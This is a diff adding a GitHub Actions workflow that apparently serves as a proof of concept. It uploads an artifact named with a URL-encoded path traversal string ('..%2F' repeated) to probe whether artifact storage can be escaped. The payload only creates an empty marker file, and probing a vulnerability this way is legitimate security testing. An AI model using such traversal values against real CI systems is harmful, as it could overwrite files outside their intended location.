@@ -1,0 +1,19 @@
+name: first
+
+on:
+  pull_request:
+  push:
+    branches: [master, develop]
+
+jobs:
+  test-poc:
+    name: bla bla
+    runs-on: ubuntu-latest
+    steps:
+      - name: Generate File
+        run: touch /tmp/pwn.txt
+      - name: upload artifact
+        uses: actions/upload-artifact@v3
+        with:
+          name: ..%2F..%2F..%2F..%2F..%2F..%2Fcake
+          path: /tmp/pwn.txt
